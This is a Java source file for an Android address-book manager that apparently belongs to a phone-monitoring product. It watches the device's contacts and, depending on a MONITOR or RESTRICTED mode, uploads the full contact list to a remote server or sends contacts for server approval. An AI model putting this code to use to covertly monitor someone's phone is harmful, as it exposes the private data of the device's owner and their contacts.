package com.vvt.daemon_addressbook_manager;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxAddressbookMode;
import com.vvt.base.FxCallerID;
import com.vvt.base.FxEvent;
import com.vvt.daemon_addressbook_manager.contacts.sync.Contact;
import com.vvt.daemon_addressbook_manager.delivery.AddressbookDeliveryManager;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.DataProvider;
import com.vvt.phoenix.prot.command.response.GetAddressBookResponse;
import com.vvt.phoenix.prot.event.AddressBook;
import com.vvt.processaddressbookmanager.monitor.AddressBookHelper;
import com.vvt.processaddressbookmanager.monitor.AddressbookEventListner;
import com.vvt.processaddressbookmanager.monitor.AddressbookObserver;
import com.vvt.processaddressbookmanager.repository.AddressbookRepository;


/**
 * @author Aruna
 * @version 1.0
 * @created 07-Oct-2011 03:22:51
 */
public class AddressbookManagerImp implements AddressbookEventListner, AddressbookManager, DeliveryListener {
	private static final String TAG = "AddressbookManagerImp";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private AddressbookObserver mAddressbookChangeMonitor;
	private DataDelivery mDataDelivery;
	private FxAddressbookMode mMode = FxAddressbookMode.OFF;
	private AddressbookRepository mAddressbookRepository;
	private AddressbookDeliveryManager mAddressbookDeliveryManager;
	private OnApprovalChanged mOnApprovalChanged;
 	private AddressbookDeliveryListener mAddressbookDeliveryListener;
	private boolean mIsRunning = false;
	private int mCallerId;
	private Context mContext;
	private String mWritablePath;
	
	public AddressbookManagerImp() {
	}
	
	/**
	 * Set the delivery listener 
	 * @param dataDelivery delivery listener 
	 */
	public void setDataDelivery(DataDelivery dataDelivery) {
		mDataDelivery = dataDelivery;
	}
	
	/**
	 * Set the delivery listener 
	 * @param dataDelivery delivery listener 
	 */
	public void setContext(Context context) {
		mContext = context;
	}
	
	public void setWritablePath(String path) {
		mWritablePath = path;
	}
	
	public void initialize() throws FxNullNotAllowedException{
		
		if(mDataDelivery == null) {
			throw new FxNullNotAllowedException("DataDelivery can not be null.");
		}
		
		if(mContext == null) {
			throw new FxNullNotAllowedException("Context can not be null.");
		}
		
		if(mWritablePath == null) {
			throw new FxNullNotAllowedException("LoggablePath can not be null.");
		}
		
		mCallerId = FxCallerID.ADDRESS_BOOK_MANAGER_ID;
		mAddressbookRepository = new AddressbookRepository(mContext, mWritablePath);
		mAddressbookDeliveryManager = new AddressbookDeliveryManager(mCallerId, mContext);
		mAddressbookDeliveryManager.setAddressbookRepository(mAddressbookRepository);
		mAddressbookDeliveryManager.setDeliveryListener(this);
	}
	
	/**
	 * Set the OnApprovalChange listener here if you need notification when 
	 * approved contact list changes 
	 */
	public void setOnApprovalChanged(OnApprovalChanged approvalChanged) {
		mOnApprovalChanged = approvalChanged;
	}

	/**
	 * Send the getAddressBook command to the server.
	 */
	public synchronized void getAddressbook(AddressbookDeliveryListener listener) throws FxNullNotAllowedException { 
		if(mDataDelivery == null)
			throw new FxNullNotAllowedException("DataDelivery is null");
		
		mAddressbookDeliveryListener = listener;

		mAddressbookDeliveryManager.setDataDelivery(mDataDelivery);
		mAddressbookDeliveryManager.getAddressbook();
	}
	
	/**
	 * Send the Addressbook to the server. It will either send sendAddressbook
	 * or sendAddressbookForApproval depending on the FxAddressbookMode.
	 */
	public synchronized void sendAddressbook(AddressbookDeliveryListener listener, int delay) {
		
		if(delay > 0) {
			try { Thread.sleep(delay);} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
		mAddressbookDeliveryListener = listener;
		
		if(insertAddressbook()) {
			deliverAddressbook();
		}
	}
			
	private void deliverAddressbook() {
		if(LOGV) FxLog.v(TAG, "deliverAddressbook # START ..");
		if(LOGD) FxLog.v(TAG, "deliverAddressbook # Mode " + getMode());
		
		if (getMode() == FxAddressbookMode.MONITOR) {
				mAddressbookDeliveryManager.setDataDelivery(mDataDelivery);
				mAddressbookDeliveryManager.sendAddressbook();				
		} else if (getMode() == FxAddressbookMode.RESTRICTED) {
				mAddressbookDeliveryManager.setDataDelivery(mDataDelivery);
				mAddressbookDeliveryManager.sendAddressbookForApproval();	
		}
		
		if(LOGV) FxLog.v(TAG, "deliverAddressbook # EXIT ..");
	}
	
	/**
	 * Start monitoring the Addressbook in the restricted FxAddressbookMode. In this mode only Addressbook
	 * change will be sent to the server
	 */
	public void startRestricted() throws FxNullNotAllowedException { 
		if(mIsRunning)
			stopCapture();
		
		mMode = FxAddressbookMode.RESTRICTED;
		startCapture();
		mIsRunning = true;
	}

	/**
	 * Start monitoring the addressbook in the monitoring FxAddressbookMode. In this mode
	 * full addressbook will be send to server
	 */
	public void startMonitor() throws FxNullNotAllowedException {
		if(mIsRunning)
			stopCapture();
		
		mMode = FxAddressbookMode.MONITOR;
		startCapture();
		mIsRunning = true;
	}

	/***
	 * Stop the capturing FxAddressbookMode.
	 */
	public void stop()  {
		mMode = FxAddressbookMode.OFF;
		
		if(mIsRunning)
			stopCapture();
		
		mIsRunning = false;
	}
	
	/**
	 * Start the capturing according to the FxAddressbookMode.
	 * @throws FxNullNotAllowedException
	 */
	private void startCapture() throws FxNullNotAllowedException {
		mAddressbookChangeMonitor = new AddressbookObserver(mContext);
		mAddressbookChangeMonitor.setLoggablePath(mWritablePath);
		mAddressbookChangeMonitor.setMode(getMode());
		mAddressbookChangeMonitor.registerObserver(this);
	}
	
	/**
	 * Stop the capturing addressbook
	 */
	private void stopCapture() {
		if(mAddressbookChangeMonitor != null) {
			mAddressbookChangeMonitor.setMode(FxAddressbookMode.OFF);
			mAddressbookChangeMonitor.unregisterObserver(this);
		}
	}
	
	/**
	 * Returns list of approved contacts
	 */
	public List<ApprovedContact> getApprovedContacts() {
		AddressbookRepository addressbookRepository = new AddressbookRepository(mContext, mWritablePath);
		return addressbookRepository.getApprovedContacts();
	}
	
	/***
	 * Occurs when something changes in the addressbook
	 */
	@Override
	public void onReceive(List<FxEvent> events) {
		if(LOGV) FxLog.v(TAG, "AddressbookManagerImp # START ..");
		
		if(events.size() > 0) {
			if(insertAddressbook(events)) {
				deliverAddressbook();
			}	
		}
		
		if(LOGV) FxLog.v(TAG, "AddressbookManagerImp # EXIT ..");
	}
	
	// Insert all contacts to the db
	private boolean insertAddressbook() {
		return insertAddressbook(null);
	}
	
	// Insert selected list of contacts or all (all if null)
	private boolean insertAddressbook(List<FxEvent> events) {
		if(LOGV) FxLog.v(TAG, "insertAddressbook # START ..");
		
		List<Long> androidContactIds = null;
		boolean status = false;

		try {
			if (events == null || events.size() == 0) {
				if(LOGD) FxLog.d(TAG, "insertAddressbook # events is null or 0 ..");
				androidContactIds = AddressBookHelper.getAndroidContactIds(mContext);
			}
			else
			{
				if(LOGD) FxLog.d(TAG, "insertAddressbook # events size :" + events.size());
				androidContactIds = getIds(events);
			}

			for (Long id : androidContactIds) {
				if(LOGV) FxLog.v(TAG, " looking for contact id:" + id);
				Contact contact = AddressBookHelper.getContactDetailsById(id, mContext);
				if(LOGV) FxLog.v(TAG, " looking for contact id: " + id + " is :" + contact.toString());
				
				// If this contacts is approved, we reset back to pending ..
				if (mAddressbookRepository.hasRequest(id)) {
					mAddressbookRepository.updateStateByClientId(id, Contact.PENDING, contact);
				} else {
					if(LOGV) FxLog.v(TAG, " looking for contact id: " + id + " adding to repo ");
					mAddressbookRepository.insertContact(contact);
				}
			}

			status = true;
		} catch (Exception ex) {
			FxLog.e(TAG, ex.toString());
			status = false;
		}
		
		if(LOGV) FxLog.v(TAG, "insertAddressbook #  EXIT ..");
		return status;
	}
	
 	private List<Long> getIds(List<FxEvent> events) {
		List<Long> ids = new ArrayList<Long>();
		
		for(FxEvent e: events) {
			ids.add(e.getEventId());
		}
		
		return ids;
	}
	
	/**
	 * Process the GetAddressBook response data here.
	 * @param response
	 */
	private void processGetAddressbookResponse(GetAddressBookResponse response) {
		AddressBook book = null;
		DataProvider vcProvider = null;
		
		if(response.getAddressBookCount() > 0) {
			
			 //Stop the capturing..
			FxAddressbookMode modeBeforeStop = getMode();
			 stop();
			
			mAddressbookRepository.deleteAllApprovedContacts();

			ProcessServerVCard serverVCard = new ProcessServerVCard();
			serverVCard.setAddressbookRepository(mAddressbookRepository, mContext);
			
			for (int i = 0; i < response.getAddressBookCount(); i++) {
				book = response.getAddressBook(i);
				vcProvider = book.getVCardProvider();
				serverVCard.parseAndProcess(vcProvider);
			}
			
			//Start the capturing back..
			try {
				if(modeBeforeStop == FxAddressbookMode.MONITOR)
					startMonitor();
				else if (modeBeforeStop == FxAddressbookMode.RESTRICTED )
					startRestricted();		
			} catch (FxNullNotAllowedException e) {
				FxLog.e(TAG, "processGetAddressbookResponse # " + e.getMessage());
			}
			
			if(mOnApprovalChanged != null)
				mOnApprovalChanged.onChange();
		}
		else
		{
			if(LOGE) FxLog.e(TAG, "processGetAddressbookResponse # Addressbook count is: 0");
		}
	}

	/**
	 * Occurs when finish delivering to the server.
	 */
	@Override
	public void onFinish(DeliveryResponse response) {
		if(LOGV) FxLog.v(TAG, "onFinish # START ..");
		
		if(response.isSuccess()) {
			 if (response.getCSMresponse().getCmdEcho() ==  CommandCode.GET_ADDRESS_BOOK) {
				 GetAddressBookResponse getAddressBookResponse =  (GetAddressBookResponse)response.getCSMresponse();
				 processGetAddressbookResponse(getAddressBookResponse);
			 }
			 else {
				mAddressbookRepository.updateStateFromDeliveringToWaiting();
			 }
		 }
		 else {
			 mAddressbookRepository.updateStateFromDeliveringToPending();
		 }
		
		if(mAddressbookDeliveryListener != null) { 
			if(response.isSuccess()) {
				mAddressbookDeliveryListener.onSuccess();
			}
			else {
				mAddressbookDeliveryListener.onError(response.getStatusCode(), response.getStatusMessage());
			}
		}
		
		if(LOGV) FxLog.v(TAG, "onFinish # EXIT ..");
	}

	@Override
	public void onProgress(DeliveryResponse response) { }
	
	/**
	 * Returns the current mode that's component in.
	 * @return
	 */
	public FxAddressbookMode getMode() {
		return mMode;
	}
	
	@Override
	public void setMode(FxAddressbookMode mode) {
		mMode = mode;
	}

	@Override
	public int getAddressBookCount() {
		return AddressBookHelper.getAddressBookCount(mContext);
	}
 
}